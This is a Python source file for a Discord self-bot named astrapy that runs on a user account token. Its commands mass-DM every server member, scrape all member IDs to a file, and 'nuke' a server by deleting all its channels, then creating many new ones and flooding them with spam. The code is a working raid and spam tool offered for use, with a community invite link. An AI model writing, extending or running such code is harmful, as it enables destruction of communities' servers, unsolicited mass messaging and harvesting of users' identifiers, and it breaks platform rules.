import discord
from discord.ext import commands
import json
import random
import time
import asyncio
import sys
import aiohttp


with open("config.json", "r") as file:
    config = json.load(file)
token = config["token"]
prefix = config["prefix"]
NukeMessage = config.get("nuke", {}).get("message", "")
channel_name = config.get("channel_name", "channel")
amount_messages = config.get("amount_messages")
amount_channels = config.get("amount_channels")


astrapy = commands.Bot(command_prefix=prefix, self_bot=True)


async def error_message(ctx, error_message):
    await ctx.send(f"Error: {error_message}")


def error_console(error_message):
    print("\033[91m" + error_message + "\033[0m")


required = 'https://github.com/astrapy","https://discord.gg/baMAyb4jeG'

astrapy.remove_command("help")


@astrapy.command()
async def help(ctx):
    await ctx.message.delete()

    help = "**Commands:**\n"
    help += f"```{prefix}dmall - Send a DM to all members.\n"
    help += f"{prefix}scrape - Scrape all userids from all members and save it.\n"
    help += f"{prefix}nuke <channels to create> <message to send> - You know what it does...```"

    help += "https://github.com/astrapy"

    await ctx.send(help)


@astrapy.command()
async def dmall(ctx, *, message: str = None):
    await ctx.message.delete()

    if message is None:
        message = config.get("dmall", {}).get("message", "")
    members = ctx.guild.members

    for member in members:
        if member == astrapy.user:
            continue
        try:
            await member.send(message)
            await asyncio.sleep(1)
        except discord.Forbidden:
            print(f"Could not send a message to ({member.id}). Skipping.")
        except Exception as e:
            print(f"Error while sending a message to ({member.id}): {e}")
    await ctx.send("DM successfully sent to all members.")


@astrapy.command()
async def scrape(ctx):
    await ctx.message.delete()

    members = ctx.guild.members

    with open("output/userids.txt", "w") as file:
        for member in members:
            file.write(f"{member.id}\n")
    await ctx.send("User ids saved into `output/userids.txt`.")


async def do_spam(channel):
    try:
        if NukeMessage and NukeMessage.strip():
            await channel.send(NukeMessage)
        else:
            print(f"Skipped sending into {channel.name} ({channel.id}).")
    except discord.Forbidden:
        print(f"Couldnt send a message into {channel.name} ({channel.id}).")
    except Exception as e:
        print(f"Error while sending a message into {channel.name} ({channel.id}): {e}")


@astrapy.command()
async def nuke(ctx):
    await ctx.message.delete()

    d_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*d_tasks, return_exceptions=True)

    tasks = []

    c_tasks = [create(ctx) for _ in range(amount_channels)]
    await asyncio.gather(*c_tasks)


async def create(ctx):
    try:
        t_channel = await ctx.guild.create_text_channel(channel_name)

        m_tasks = [do_spam(t_channel) for _ in range(amount_messages)]
        await asyncio.gather(*m_tasks)
    except discord.Forbidden:
        print(
            f"Could not create a channel or send messages into {ctx.channel.name} ({ctx.channel.id})."
        )
    except Exception as e:
        print(
            f"Error while creating a channel or sending messages into {ctx.channel.name} ({ctx.channel.id}): {e}"
        )


@astrapy.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    error_console(f"Error: {error}")
    await error_message(ctx, f"Error: {error}")


astrapy.run(token)

# Any suggestion, join the discord an create an suggestion: https://discord.gg/baMAyb4jeG